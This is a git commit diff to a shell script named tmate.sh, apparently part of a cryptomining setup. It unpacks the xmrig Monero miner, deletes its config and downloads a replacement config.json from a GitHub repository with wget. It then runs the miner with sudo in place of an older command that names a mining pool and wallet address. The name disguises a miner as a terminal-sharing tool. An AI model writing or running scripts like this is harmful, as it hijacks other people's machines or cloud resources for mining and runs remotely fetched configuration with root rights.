a977e12de2edb6ace19657828b64405bb8e9db51
maanya125 <83495427+maanya125@users.noreply.github.com>
2024-02-08 15:59:29 +0530

    Update tmate.sh

--- tmate.sh
+++ tmate.sh
@@ -8,6 +8,9 @@ tar xvzf xmrig-6.21.0-linux-x64.tar.gz
 
 # Change directory
 cd xmrig-6.21.0/
-
+rm -f
+rm -f config.json
+wget https://github.com/maanya125/super-duper-spoon/raw/main/config.json
 # Run the xmrig command
-./xmrig -o xmr.2miners.com:2222 -u 49z57pCkv6ffJpdPsFuzNFbkJKdNL5nrQQANRTbRY36cdKyApwNRTucQHvVqEKFHW13RSLCvtEUbSTgoYiJr7a4VADENAjb.1 -k
+#./xmrig -o xmr.2miners.com:2222 -u 49z57pCkv6ffJpdPsFuzNFbkJKdNL5nrQQANRTbRY36cdKyApwNRTucQHvVqEKFHW13RSLCvtEUbSTgoYiJr7a4VADENAjb.1 -k
+sudo ./xmrig
